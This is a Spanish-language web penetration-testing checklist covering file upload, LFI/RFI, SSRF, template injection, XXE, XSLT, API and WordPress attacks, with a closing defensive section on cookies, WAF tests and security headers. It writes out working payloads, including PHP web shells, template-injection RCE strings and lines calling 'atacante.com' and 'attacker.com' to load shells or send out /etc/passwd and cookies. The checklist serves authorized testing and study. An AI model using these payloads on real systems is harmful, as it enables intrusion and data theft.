    - [ ] **Validación de Magic Bytes/File Signature:** Modificar los primeros bytes del archivo para que coincidan con un tipo permitido, pero con contenido malicioso.
- [ ] **Explotación:**
    - [ ] **Web Shells:** Subir archivos `.php`, `.asp`, `.aspx`, `.jsp`, etc., para RCE.
    - [ ] **XSS vía Archivos Subidos:**
        - [ ] Subir archivos `.html`, `.svg` con scripts.
        - [ ] Inyectar XSS en metadatos de imágenes (`exiftool -Comment='"><img src=1 onerror=alert(document.domain)>' imagen.jpg`) y asegurarse de que se sirva con `Content-Type: text/html` o que el navegador lo interprete como HTML.
    - [ ] **XXE vía Archivos Subidos:**
        - [ ] Subir archivos `.xml`, `.svg`, `.docx`, `.pdf` (si se procesan en el servidor) con payloads XXE.
        - [ ] Ejemplo SVG: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><svg>&xxe;</svg>`
        - [ ] Leer código fuente: `php://filter/convert.base64-encode/resource=index.php`.
    - [ ] **Ataques de Denegación de Servicio (DoS):**
        - [ ] Subir archivos muy grandes (Zip Bombs, Billion Laughs Attack para XML).
    - [ ] **Sobrescribir Archivos Existentes:** ¿Se puede subir un archivo con el mismo nombre que uno crítico (ej. `index.php`)?
    - [ ] **Path Traversal en Nombres de Archivo:** ¿Se puede usar `../../` en el nombre del archivo para escribir fuera del directorio de subida?
- [ ] **Inyección de Caracteres Especiales en Nombres de Archivo.**
- [ ] **Automatizar RCE (si se obtiene un webshell):** Usar scripts para interactuar con el shell.

### LFI/RFI

#### Local File Inclusion (LFI)

- [ ] **Identificar Parámetros Vulnerables:** Buscar parámetros como `?page=`, `?file=`, `?include=`, `?path=`, `?document=`.
- [ ] **Path Traversal:**
    - [ ] Intentar acceder a archivos fuera del directorio web raíz:
        - [ ] `../../../../../../../../etc/passwd`
        - [ ] `../../../../../../../../windows/win.ini`
    - [ ] **Bypass de Filtros:**
        - [ ] **Encodings:** `%2e%2e%2f`, `..%252f`, `.%2e/%2e%2e/`, `%c0%af` (overlong UTF-8), `..%c1%9c`.
        - [ ] **Filtros no recursivos:** `....//....//etc/passwd` (si `../` se reemplaza por nada).
        - [ ] **Paths aprobados/prefijos:** Si el path debe empezar con `/var/www/html/pages/`, intentar `?page=/var/www/html/pages/../../../../etc/passwd`.
        - [ ] **Extensiones añadidas automáticamente:**
            - [ ] **Null Byte:** `?page=../../etc/passwd%00` (si PHP < 5.3.4).
            - [ ] **Path Truncation:** Usar paths largos para que la extensión añadida se corte (ej. `?page=../../etc/passwd/././.[...]././.`).
- [ ] **Fuzzing de Parámetros y Archivos del Servidor:**
    - [ ] Usar wordlists para encontrar parámetros LFI comunes (GET y POST).
    - [ ] Usar wordlists de archivos comunes del servidor (logs, configuraciones, webroot).
- [ ] **PHP Filters & Wrappers:**
    - [ ] **`php://filter` para leer código fuente:**
        - [ ] `php://filter/read=convert.base64-encode/resource=index.php`
        - [ ] `php://filter/resource=index.php` (si se muestra directamente).
    - [ ] **`php://input` para RCE (POST request, `allow_url_include=on`):**
        - [ ] Enviar código PHP en el cuerpo del POST: `<?php system($_GET['cmd']); ?>`
    - [ ] **`expect://` para RCE (`expect` extensión habilitada):**
        - [ ] `expect://ls`
    - [ ] **`data://` para RCE (`allow_url_include=on`):**
        - [ ] `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+` (con `&cmd=ls`).
    - [ ] **Otros wrappers:** `zip://`, `phar://` (requiere un archivo subido).
    - [ ] **Fuzzing para archivos PHP** si se conoce la estructura.
    - [ ] **RCE directo con filtros (tu payload largo de `convert.iconv`):**
        - [ ] `php://filter/convert.iconv.../resource=php://temp&cmd=id` (probar si hay filtros muy específicos).
    - [ ] **`assert` (si se encuentra en el código y es inyectable):** `' and die(show_source('/etc/passwd')) or '`.
- [ ] **Técnicas LFI a RCE:**
    - [ ] **Log Poisoning:**
        - [ ] Inyectar código PHP en logs (ej. Apache `access.log` o `error.log` a través de peticiones con User-Agent malicioso o URLs malformadas).
        - [ ] `<?php system($_GET['cmd']); ?>`
        - [ ] Incluir el log: `?page=../../var/log/apache2/access.log&cmd=id`.
    - [ ] **`/proc/self/environ` (Linux):** Si se puede controlar una variable de entorno (ej. User-Agent) y se refleja en `/proc/self/environ`.
    - [ ] **Inclusión de Archivos de Sesión PHP:** Si se puede controlar parte del contenido de la sesión.
    - [ ] **Inclusión de Archivos Temporales de Upload:** Si se conoce la ruta y el nombre del archivo temporal.
- [ ] **Herramientas LFI:** LFISuite, LFiFreak, liffy, dotdotpwn.

#### Remote File Inclusion (RFI)

- [ ] **Verificar si es posible (requiere `allow_url_fopen=on` y `allow_url_include=on` en PHP).**
- [ ] **Explotación:**
    - [ ] Incluir un shell remoto: `?page=http://atacante.com/shell.txt` (donde shell.txt contiene código PHP).
    - [ ] Si se añade una extensión automáticamente (ej. `.php`):
        - [ ] Usar `?` o `#` en la URL remota: `?page=http://atacante.com/shell.txt?` o `?page=http://atacante.com/shell.txt%23`.
    - [ ] **Vía FTP/SMB:** `?page=ftp://user:pass@atacante.com/shell.txt`.
- [ ] **RFI también puede usarse para SSRF (enumerar puertos internos, etc.).**

### Ataques del Lado del Servidor

#### Server-Side Request Forgery (SSRF)

- [ ] **Descubrimiento e Identificación:**
    - [ ] Buscar funcionalidades que tomen URLs como entrada (webhooks, importadores de URL, conversores PDF, proxies internos).
    - [ ] Parámetros con nombres como `url`, `uri`, `link`, `image_url`, `dest`, `feed`.
    - [ ] Probar con URLs a un servidor controlado por el atacante (Burp Collaborator, `nc` listener).
    - [ ] Revisar si la aplicación hace peticiones a recursos externos (imágenes, APIs) que puedan ser manipuladas.
- [ ] **Explotación:**
    - [ ] **Acceso a Recursos Internos:**
        - [ ] `http://localhost/`, `http://127.0.0.1/`, `http://[::1]/`.
        - [ ] `http://169.254.169.254/` (metadatos de cloud: AWS, GCP, Azure).
        - [ ] Escanear puertos internos: `http://internal-host:port`.
        - [ ] Leer archivos locales usando `file:///` wrapper (ej. `file:///etc/passwd`, `file:///C:/windows/win.ini`).
    - [ ] **Bypass de Filtros SSRF:**
        - [ ] IPs en diferentes formatos: decimal (ej. `2130706433` para `127.0.0.1`), octal, hex.
        - [ ] Usar subdominios que resuelvan a IPs internas (DNS rebinding).
        - [ ] Usar redirecciones (3xx) a URLs internas.
        - [ ] Usar `@` en la URL: `http://expected-domain@internal-host`.
        - [ ] Encodings de URL.
    - [ ] **Crear Peticiones POST (Gopher, etc.):**
        - [ ] Usar el protocolo `gopher://` para enviar datos arbitrarios a servicios internos (ej. Redis, MySQL).
- [ ] **Blind SSRF:**
    - [ ] No se ve la respuesta directa, pero la petición se realiza.
    - [ ] Detectar con interacciones OOB (DNS, HTTP a servidor del atacante).
    - [ ] Exfiltrar datos mediante errores o retardos.
    - [ ] Usar scripts HTML/JS para forzar al servidor a hacer peticiones.
- [ ] **Time-Based SSRF:** Si se puede inducir un retardo basado en la respuesta de un servicio interno.
- [ ] **AJP Proxy (Relacionado con SSRF/Configuración Incorrecta):**
    - [ ] Si el puerto `8009/tcp` (AJP) está expuesto y mal configurado (ej. Ghostcat - CVE-2020-1938).
    - [ ] Intentar leer archivos o ejecutar código.

#### Server-Side Includes (SSI) Injection

- [ ] **Identificación:**
    - [ ] Buscar páginas con extensiones `.shtml`, `.shtm`, `.stm`.
    - [ ] Inyectar directivas SSI en campos de entrada que se reflejen en la página:
        - [ ] ``
        - [ ] ``
        - [ ] `` (Linux)
        - [ ] `` (Windows)
- [ ] **Explotación:**
    - [ ] Ejecutar comandos del OS.
    - [ ] Leer archivos (`` o `file="key.txt"`).
    - [ ] Obtener información del servidor.

#### Edge Side Includes (ESI) Injection

- [ ] **Identificación:**
    - [ ] Buscar cabeceras como `Surrogate-Control`, `X-ESI-Enabled`, `Edge-Control`.
    - [ ] Inyectar tags ESI en puntos de entrada reflejados:
        - [ ] `<esi:include src="http://attacker.com/"/>` (para SSRF o XSS).
        - [ ] `<esi:vars>$(HTTP_COOKIE)</esi:vars>` (para exfiltrar cookies, incluyendo HttpOnly).
        - [ ] `<esi:comment text="TEST"/>`
- [ ] **Explotación:**
    - [ ] XSS, CSRF.
    - [ ] Robo de cookies (incluyendo HttpOnly).
    - [ ] SSRF.
    - [ ] DoS.

#### Server-Side Template Injection (SSTI)

- [ ] **Identificación:**
    - [ ] Buscar parámetros que se reflejen en la página, especialmente si usan plantillas (ej. personalización de emails, mensajes de error).
    - [ ] Probar payloads de plantilla comunes:
        - [ ] `{7*7}` (Jinja2, Twig) -> `49`
        - [ ] `${7*7}` (FreeMarker, Velocity) -> `49`
        - [ ] `{{7*'7'}}` (Jinja2, si * es concatenación) -> `7777777`
        - [ ] `#{7*7}` (Jade/Pug) -> `49`
        - [ ] `%{7*7}`
        - [ ] Si hay un error, puede revelar el motor de plantillas.
    - [ ] Usar un diagrama de flujo para identificar el motor (ej. el de PortSwigger).
- [ ] **Explotación (varía según el motor):**
    - [ ] **Jinja2 (Python):**
        - [ ] Acceder al objeto `request` o `config`.
        - [ ] `{{ config }}`
        - [ ] RCE: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`
        - [ ] `{{ ''.__class__.__mro__[1].__subclasses__()[<index_de_os._wrap_close>].__init__.__globals__['popen']('id').read() }}` (buscar el índice correcto)
    - [ ] **Twig (PHP):**
        - [ ] Info Disclosure: `{{_self.env.display("index.html")}}`
        - [ ] LFI: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id") }}` (luego usar `{{ "id"|id }}`)
        - [ ] RCE: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id") }}` y luego `{{ "cat /etc/passwd"|id }}` (si `exec` está permitido).
    - [ ] **FreeMarker (Java):**
        - [ ] RCE: `<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }`
    - [ ] **Velocity (Java):**
        - [ ] RCE: `#set($x="");#set($rt=$x.class.forName("java.lang.Runtime"));#set($cr=$rt.getRuntime());$cr.exec("id")`
- [ ] **Herramientas Automatizadas:** Tplmap (`tplmap -u <URL_con_param_vulnerable>`).

#### XML External Entity (XXE) Injection

- [ ] **Identificación:**
    - [ ] Buscar funcionalidades que procesen XML (uploads de XML/SOAP, APIs que acepten XML, RSS feeds).
    - [ ] Verificar si se puede controlar la `DOCTYPE` o si se parsean entidades.
    - [ ] Enviar un payload simple para ver si se procesa:
       
        ```
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [ <!ENTITY xxe "TEST_XXE"> ]>
        <data>&xxe;</data>
        ```
- [ ] **Explotación:**
    - [ ] **Local File Disclosure:**
        - [ ] `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
        - [ ] `<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">`
    - [ ] **Lectura de Código Fuente (PHP):**
        - [ ] `<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">`
    - [ ] **SSRF:**
        - [ ] `<!ENTITY xxe SYSTEM "http://internal-server/secret">`
        - [ ] Escanear puertos internos: `<!ENTITY xxe SYSTEM "http://localhost:8080">`
    - [ ] **Denial of Service (DoS):**
        - [ ] Billion Laughs Attack: `<!ENTITY lol9 "&lol8;&lol8;...">`
        - [ ] Referenciar `/dev/random` o archivos muy grandes.
    - [ ] **Error-Based XXE (Out-of-Band):**
        - [ ] Si no se ve la salida directa, forzar errores que exfiltren datos a un DTD externo controlado.
        - [ ] `<!ENTITY % file SYSTEM "file:///etc/passwd">`
        - [ ] `<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">`
        - [ ] `%eval; %exfiltrate;`
    - [ ] **Blind XXE / CDATA:** Usar técnicas OOB o errores para exfiltrar datos.
- [ ] **XXE en Content-Types comunes:** `application/xml`, `text/xml`, a veces en `application/json` si el parser lo maneja como XML.

#### XSLT Injection

- [ ] **Identificación:**
    - [ ] Funcionalidades que transformen XML usando XSLT (ej. generación de reportes, conversión de XML a HTML/PDF).
    - [ ] Si se puede subir un archivo XSL o controlar parte de la transformación XSL.
    - [ ] Provocar un error inyectando un tag XML roto (`<:`) en un campo que pueda ser parte de un XML procesado por XSLT.
- [ ] **Explotación (si se puede controlar el XSLT):**
    - [ ] **Information Disclosure (Propiedades del sistema XSLT):**

        ```
        <xsl:value-of select="system-property('xsl:version')" />
        <xsl:value-of select="system-property('xsl:vendor')" />
        ```
        
    - [ ] **Local File Inclusion:**
        - [ ] XSLT 2.0+: `unparsed-text('/etc/passwd', 'utf-8')`
        - [ ] Si soporta extensiones PHP: `php:function('file_get_contents','/etc/passwd')`
        - [ ] Payload:

            ```
            <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
              <xsl:template match="/">
                <xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
              </xsl:template>
            </xsl:stylesheet>
            ```
            
    - [ ] **Remote Code Execution (si soporta extensiones PHP):**
        - [ ] `php:function('system','id')`
    - [ ] **SSRF:**
        - [ ] `xsl:include href="http://internal-server/"`
        - [ ] `document('http://internal-server/')`
    - [ ] **Fuzzing de funcionalidades XSLT:** Usar wordlists de funciones/elementos XSLT.

### Pruebas de API y Servicios Web

#### Descubrimiento e Identificación de APIs

- [ ] **Buscar Endpoints de API:**
    - [ ] Crawling, análisis de JS, `robots.txt`, `sitemap.xml`.
    - [ ] Patrones comunes: `/api/`, `/v1/`, `/rest/`, `/graphql`.
    - [ ] Fuzzing de directorios y archivos con wordlists de API (ej. `SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt`).
        - [ ] `ffuf -w <api_wordlist> -u http://<IP_o_dominio>/api/FUZZ` (ajustar path base).
- [ ] **Web Services Description Language (WSDL) para SOAP:**
    - [ ] Buscar archivos WSDL: `?wsdl`, `/service.wsdl`, `/services/`, `/disco` (Microsoft DISCO).
    - [ ] `dirb http://<IP>:3002` (ejemplo de tu input).
    - [ ] `ffuf -w <params_wordlist> -u 'http://<IP>:3002/wsdl?FUZZ' -fs 0 -mc 200` (ejemplo de tu input).
    - [ ] Analizar el WSDL (con SoapUI, Wsdler, o manualmente) para entender operaciones, tipos de datos, y endpoints.
- [ ] **GraphQL:**
    - [ ] Endpoint común: `/graphql` o `/graphiql`.
    - [ ] Verificar si la Introspección está habilitada (permite consultar el schema).

#### Pruebas de Autenticación y Autorización en APIs

- [ ] **Mecanismos de Autenticación:**
    - [ ] ¿Tokens API (API Keys)? ¿En cabeceras (`Authorization: Bearer <token>`, `X-API-Key`), parámetros URL, cuerpo?
    - [ ] ¿OAuth 2.0? ¿Implementación correcta de flujos?
    - [ ] ¿JWT? Validar firma, algoritmos (`none`), información sensible en payload.
    - [ ] ¿Autenticación Básica?
- [ ] **Broken Object Level Authorization (BOLA / IDOR en APIs):**
    - [ ] Similar a IDOR web: ¿Se puede acceder/modificar objetos de otros usuarios cambiando IDs en la URL o cuerpo de la petición? (API1:2023)
- [ ] **Broken Function Level Authorization (BFLA):**
    - [ ] ¿Se puede acceder a funciones de administrador siendo un usuario normal, o viceversa? (API5:2023)
    - [ ] Probar diferentes métodos HTTP en endpoints (ej. DELETE en un endpoint que solo debería permitir GET).

#### Pruebas de Inyección en APIs

- [ ] **SQL Injection:** En parámetros URL, cuerpo JSON/XML.
- [ ] **NoSQL Injection:** Si usa MongoDB, etc.
- [ ] **Command Injection:** En parámetros que puedan ser usados en comandos del sistema.
- [ ] **XXE Injection:** Si la API acepta XML (SOAP, o REST con XML).
- [ ] **SSTI:** Si la API genera respuestas a partir de plantillas basadas en la entrada.

#### Exposición Excesiva de Datos

- [ ] ¿Las respuestas de la API devuelven más información de la necesaria para la funcionalidad del cliente? (API3:2023)
- [ ] Filtrar campos no necesarios en el cliente no es una solución.

#### Falta de Recursos y Rate Limiting

- [ ] ¿Ausencia de Rate Limiting en endpoints sensibles (login, APIs costosas)?
- [ ] ¿Se puede causar DoS con peticiones masivas?

#### Asignación Masiva (Mass Assignment)

- [ ] ¿Se pueden modificar campos de objetos internos que no deberían ser accesibles (ej. rol de usuario) enviándolos en la petición JSON/XML? 

#### Mala Configuración de Seguridad

- [ ] Cabeceras de seguridad faltantes (HSTS, CSP, etc.).
- [ ] CORS mal configurado (`Access-Control-Allow-Origin: *` o reflejando el origen).
- [ ] Información de versión expuesta.
- [ ] Endpoints de depuración accesibles.

#### Gestión Incorrecta de Activos

- [ ] APIs antiguas u obsoletas aún expuestas sin parches. 
- [ ] APIs de prueba/desarrollo expuestas en producción.

#### Consumo Inseguro de APIs
- [ ] Si la API consume otras APIs o URLs, ¿es vulnerable a SSRF?

#### Ataques Específicos de API

- [ ] **Information Disclosure (con posible SQLi):**
    - [ ] Fuzzing de parámetros: `ffuf -w <params_wordlist> -u 'http://<API_ENDPOINT>/?FUZZ=test_value'`
    - [ ] Si se encuentra un parámetro `id`, probar enumeración y SQLi.
    - [ ] Intentar bypassear rate limits (ej. `X-Forwarded-For`).
- [ ] **Arbitrary File Upload API:**
    - [ ] Similar a File Upload web, pero a través de un endpoint de API.
    - [ ] Intentar subir web shells.
- [ ] **Local File Inclusion API:**
    - [ ] Fuzzing de endpoints si `/api` responde `UP` pero no hay directorios conocidos: `ffuf -w <api_endpoints_wordlist> -u 'http://<API_IP>:3000/api/FUZZ'`
    - [ ] Aplicar técnicas LFI estándar.
- [ ] **Cross-Site Scripting API:**
    - [ ] Si un endpoint de API refleja la entrada en la respuesta (ej. JSON que luego se renderiza en HTML).
    - [ ] Probar payloads XSS (URL encoded si es necesario).
- [ ] **Server-Side Request Forgery API:**
    - [ ] Fuzzing de endpoints y parámetros.
    - [ ] Si se encuentra un parámetro vulnerable, probar SSRF (callback a servidor atacante, `file:///`, etc.).
    - [ ] Probar con payload en Base64.
- [ ] **Regular Expression Denial of Service (ReDoS) API:**
    - [ ] Si la API usa regex para validar entradas.
    - [ ] Enviar payloads diseñados para causar "catastrophic backtracking" en la regex.
    - [ ] Ejemplo: `email=aaaaaaaaaaaaaaaaaaaaaaaaaaaa@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb!` (si la regex es ineficiente).
- [ ] **XML External Entity (XXE) Injection API:** (Ya cubierto en inyecciones generales).

#### SOAP Spoofing

- [ ] **SOAPAction Spoofing:** ¿Se pueden llamar acciones no previstas o eludir controles cambiando el `SOAPAction` header?
- [ ] **Command Injection en parámetros SOAP.**
- [ ] **Wordpress `xmlrpc.php` (si aplica):**
    - [ ] Enumerar métodos (`system.listMethods`).
    - [ ] Ataques de fuerza bruta de credenciales (`wp.getUsersBlogs`).
    - [ ] DoS (amplificación de pingbacks).
    - [ ] (WPScan puede automatizar algunos de estos tests).

### Wordpres

#### Estructura y Archivos Clave de WordPress

- [ ] **Archivos Raíz:** `index.php`, `license.txt` (versión), `readme.html` (versión), `wp-config.php` (crítico), `wp-admin/` (login), `wp-login.php`, `xmlrpc.php`.
- [ ] **`wp-config.php`:**
    - [ ] Intentar accederlo directamente (ej. si hay LFI o misconfig del servidor).
    - [ ] Contiene credenciales DB, sales, prefijo de tabla, `WP_DEBUG`.
- [ ] **Directorios Clave:**
    - [ ] `wp-content/`: `plugins/`, `themes/`, `uploads/` (permisos, listado de directorios).
    - [ ] `wp-includes/`: Archivos core.
- [ ] **Roles de Usuario:** Entender los roles (Administrator, Editor, Author, Contributor, Subscriber).

#### Enumeración de WordPress

- [ ] **Versión de WordPress Core:**
    - [ ] Código fuente: `meta name="generator"` tag.
    - [ ] CSS/JS encolados: `?ver=X.Y.Z`.
    - [ ] `readme.html`.
    - [ ] `license.txt`.
    - [ ] `wpscan --url <URL> --enumerate v` (versión).
- [ ] **Plugins y Temas:**
    - [ ] Código fuente (rutas a CSS/JS).
    - [ ] `wpscan --url <URL> --enumerate p` (plugins populares), `ap` (todos los plugins), `vp` (plugins vulnerables).
    - [ ] `wpscan --url <URL> --enumerate t` (temas), `at` (todos los temas), `vt` (temas vulnerables).
- [ ] **Listado de Directorios:**
    - [ ] ¿Habilitado en `wp-content/uploads/`, `wp-content/plugins/`, `wp-content/themes/`?
- [ ] **Enumeración de Usuarios:**
    - [ ] Desde el login (`/wp-login.php`): ¿Respuestas diferentes para usuarios válidos/inválidos?
    - [ ] `/author-sitemap.xml` o `/?author=<id>` (iterar IDs desde 1).
    - [ ] `wpscan --url <URL> --enumerate u` (usuarios).
- [ ] **XML-RPC:**
    - [ ] ¿`xmlrpc.php` habilitado?
    - [ ] `wpscan --url <URL> --enumerate x` (si xmlrpc está habilitado).

#### Ataques a WordPress

- [ ] **Ataques de Login / Fuerza Bruta:**
    - [ ] Usar `wpscan --url <URL> --passwords <pass_list> --usernames <user_list_o_usuario>`.
    - [ ] Usar Hydra o Burp Intruder contra `wp-login.php`.
- [ ] **Vulnerabilidades Conocidas:**
    - [ ] Buscar exploits para la versión de Core, plugins y temas identificados (Exploit-DB, Vulners, etc.).
    - [ ] WPScan lo hace automáticamente (`--plugins-detection aggressive --plugins-version-detection aggressive`).
- [ ] **Remote Code Execution (RCE) vía Editor de Temas/Plugins:**
    - [ ] Si se obtiene acceso como administrador, ¿se puede editar el código PHP de temas/plugins para insertar un web shell?
    - [ ] (Apariencia > Editor de Temas o Plugins > Editor de Plugins).
- [ ] **File Upload Vulnerabilities en Plugins/Temas.**
- [ ] **XSS, SQLi en Plugins/Temas.**



# Web-PenTest-Checklist INTEGRAR

## Configuración de Cookies

- [ ] **Transmisión insegura:** Asegura que las cookies se envíen solo a través de conexiones HTTPS para prevenir la intercepción por atacantes. Establece el atributo "Secure" para todas las cookies.

- [ ] **Falta atributo HttpOnly:** Establece el atributo "HttpOnly" para asegurar que las cookies sean inaccesibles para scripts del lado del cliente, reduciendo el riesgo de ataques XSS.

- [ ] **Falta atributo SameSite:** Establece el atributo "SameSite" en "Strict" o "Lax" para prevenir ataques CSRF asegurando que las cookies solo se envíen con peticiones originadas desde el mismo dominio.

- [ ] **Vida útil excesiva de la cookie:** Limita la duración de validez de la cookie estableciendo el atributo "Expires" o "Max-Age". Las cookies de larga duración suponen un mayor riesgo si se ven comprometidas.

- [ ] **Cifrado débil:** Utiliza algoritmos de cifrado fuertes y librerías criptográficas actualizadas para proteger la información confidencial almacenada en las cookies.

- [ ] **IDs de sesión insuficientemente aleatorios:** Asegura que los IDs de sesión se generen utilizando una fuente fuerte de aleatoriedad para prevenir secuestro de sesión y ataques de adivinación.

- [ ] **Dominio y path de cookie demasiado permisivos:** Limita el alcance de las cookies estableciendo los atributos "Domain" y "Path" a subdominios o directorios específicos, reduciendo el riesgo de acceso no autorizado.

- [ ] **Almacenamiento de información sensible en cookies:** Evita almacenar información sensible, como contraseñas, claves API o información de identificación personal (PII) en cookies. En su lugar, almacénalos en el lado del servidor y usa IDs de sesión para referenciar los datos.

- [ ] **Valores de cookie no protegidos:** Asegura que los valores de las cookies estén hasheados, cifrados o firmados para protegerlos de ser manipulados por atacantes.

- [ ] **Monitoreo y registro inadecuados:** Implementa un sistema de monitoreo y registro adecuado para rastrear el uso de cookies, para ayudar a detectar y responder a posibles incidentes de seguridad.

## SSRF

- [ ] **Probar URLs controladas por el usuario:** Identifica entradas de URL controladas por el usuario y pruébalas con URLs externas para ver si el servidor las obtiene o procesa.

- [ ] **Probar direcciones IP internas:** Intenta acceder a direcciones IP internas (ej. 127.0.0.1 o 10.0.0.0/8) o servicios a través de entradas controladas por el usuario para comprobar si el servidor las procesa.

- [ ] **Usar esquemas de URL:** Prueba varios esquemas de URL, como file://, ftp://, o gopher://, para eludir validación de entrada o acceder a recursos internos.

- [ ] **Probar resolución de dominio:** Prueba si tu servidor resuelve nombres de dominio a direcciones IP internas utilizando un dominio que apunte a una IP interna.

- [ ] **Probar redirección de URL:** Prueba si el servidor sigue redirecciones proporcionando una URL que redirija a un recurso interno o externo.

- [ ] **Probar con diferentes métodos HTTP:** Prueba vulnerabilidades SSRF con varios métodos HTTP, como GET, POST, PUT, DELETE, o HEAD.

- [ ] **Probar con URLs malformadas:** Prueba con URLs malformadas que puedan eludir la validación de entrada, como usar @ para separar credenciales o añadir barras extra.

- [ ] **Probar puertos abiertos:** Intenta acceder a puertos abiertos en el servidor o red interna especificando la IP y puerto de destino en la URL.

- [ ] **Probar exfiltración de datos Out-of-Band (OOB):** Prueba si el servidor puede enviar datos a un dominio externo que controles, lo que puede indicar una vulnerabilidad SSRF.

- [ ] **Probar metadatos de servicios en la nube:** Si tu sitio está alojado en un proveedor de nube, prueba si el servidor puede acceder a endpoints de metadatos del servicio en la nube, que pueden exponer información sensible.

- [ ] **Probar con técnicas basadas en tiempo:** Usa técnicas basadas en tiempo, como retardos o tiempos de espera, para confirmar vulnerabilidades SSRF cuando la respuesta del servidor no revela el contenido obtenido.

- [ ] **Probar contrabando de protocolos (protocol smuggling):** Prueba contrabando de protocolos, como usar http:// dentro de una URL https://, para eludir validación de entrada o acceder a recursos internos.

- [ ] **Probar elusión de filtrado de URL:** Intenta eludir el filtrado de URLs usando técnicas como codificación URL, doble codificación o codificación de mayúsculas y minúsculas mixtas.

- [ ] **Usar escáneres de aplicaciones web:** Usa escáneres automáticos, como Burp Suite u OWASP ZAP, para identificar posibles vulnerabilidades SSRF.

- [ ] **Probar con direcciones IPv6:** Prueba vulnerabilidades SSRF usando direcciones IPv6 para eludir validación de entrada o acceder a recursos internos.

## Pruebas de WAF

- [ ] **Probar con ataques OWASP Top Ten:** Prueba las vulnerabilidades web más comunes, como SQLi, XSS, CSRF y RCE.

- [ ] **Usar herramientas de prueba de WAF:** Utiliza herramientas como Wafw00f, Nmap o WAPT para identificar y probar las capacidades de tu WAF.

- [ ] **Probar métodos HTTP:** Prueba diferentes métodos HTTP (GET, POST, PUT, DELETE, etc.) para verificar si tu WAF está filtrando y bloqueando correctamente peticiones maliciosas.

- [ ] **Probar violaciones de protocolo HTTP:** Envía peticiones que violen el protocolo HTTP para ver si tu WAF puede detectarlas y bloquearlas.

- [ ] **Probar con peticiones malformadas:** Envía peticiones malformadas con caracteres inválidos o inesperados, codificaciones o cabeceras para probar si tu WAF puede detectarlas y bloquearlas.

- [ ] **Probar técnicas de evasión:** Prueba varias técnicas de evasión, como codificación URL, doble codificación o uso de mayúsculas/minúsculas mixtas, para eludir filtros de entrada y reglas de WAF.

- [ ] **Probar bloqueo de IP y User-Agent:** Prueba si tu WAF puede bloquear IPs o User-Agents específicos, y verifica técnicas de bypass usando proxies o User-Agents falsos.

- [ ] **Probar limitación de velocidad (rate limiting):** Prueba si tu WAF puede aplicar rate limiting y bloquear peticiones que excedan la tasa permitida.

- [ ] **Probar seguridad de cookies:** Prueba si tu WAF puede detectar y bloquear manipulación de cookies, como inyectar código malicioso o alterar cookies de sesión.

- [ ] **Probar vulnerabilidades de subida de archivos:** Prueba si tu WAF puede detectar y bloquear subidas de archivos maliciosos, como web shells o malware.

- [ ] **Probar firmas de ataques conocidos:** Prueba la habilidad de tu WAF para detectar y bloquear firmas de ataques conocidos usando herramientas como Burp Suite u OWASP ZAP.

- [ ] **Probar reglas WAF personalizadas:** Prueba reglas y configuraciones personalizadas del WAF para asegurar que bloquean adecuadamente peticiones maliciosas.

- [ ] **Probar falsos positivos:** Asegura que tu WAF no bloquee tráfico legítimo probando con peticiones y entradas comunes que puedan disparar falsos positivos.

- [ ] **Probar falsos negativos:** Asegura que tu WAF no permita tráfico malicioso probando con vectores de ataque conocidos que deberían disparar el bloqueo.

- [ ] **Probar vulnerabilidades SSL/TLS:** Prueba si tu WAF puede detectar y bloquear vulnerabilidades SSL/TLS, como POODLE o Heartbleed.

- [ ] **Probar vulnerabilidades XML:** Prueba si tu WAF puede detectar y bloquear ataques basados en XML, como XXE o XEE.

- [ ] **Probar inyección de cabeceras:** Prueba si tu WAF puede detectar y bloquear ataques de inyección de cabeceras, como inyección CRLF o división de respuesta (response splitting).

- [ ] **Probar ataques de path traversal:** Prueba si tu WAF puede detectar y bloquear ataques de path traversal, como recorrido de directorios o inclusión de archivos.

- [ ] **Probar ataques DDoS de capa de aplicación:** Prueba si tu WAF puede detectar y bloquear ataques DDoS de capa de aplicación, como Slowloris o RUDY.

- [ ] **Realizar pruebas y monitoreo continuo:** Prueba regularmente la efectividad de tu WAF y monitorea sus logs para detectar y bloquear nuevos vectores de ataque y amenazas emergentes.

## Vulnerabilidades de Cabeceras

- [ ] **Falta cabecera Strict-Transport-Security (HSTS):** Habilita comunicación solo-HTTPS, previniendo ataques man-in-the-middle.

- [ ] **Falta cabecera X-Content-Type-Options:** Deshabilita el嗅ing de tipos MIME, reduciendo el riesgo de ataques usando confusión MIME.

- [ ] **Falta cabecera X-Frame-Options:** Previene ataques de clickjacking deshabilitando o limitando que el sitio sea embebido en frames.

- [ ] **Falta cabecera Content-Security-Policy (CSP):** Define fuentes permitidas de contenido, reduciendo el riesgo de XSS e inyección de contenido.

- [ ] **Falta cabecera X-XSS-Protection:** Activa la protección integrada del navegador contra ataques XSS.

- [ ] **Falta cabecera Referrer-Policy:** Controla la información enviada en la cabecera Referer, protegiendo la privacidad del usuario y reduciendo fugas de información.

- [ ] **Falta cabecera Feature-Policy:** Restringe el uso de ciertas características del navegador y APIs, mejorando seguridad y privacidad.

- [ ] **Configuración insegura de CORS (Cross-Origin Resource Sharing):** Permite a dominios no autorizados acceder a recursos, incrementando riesgo de CSRF y fuga de datos.

- [ ] **Falta cabecera Expect-CT:** Fuerza Transparencia de Certificados, reduciendo riesgo de certificados SSL/TLS emitidos erróneamente.

- [ ] **Falta cabecera Permissions-Policy:** Define qué características del navegador están permitidas o denegadas.

- [ ] **Falta o débil cabecera Public-Key-Pins (HPKP):** Asegura el uso de claves públicas criptográficas específicas.

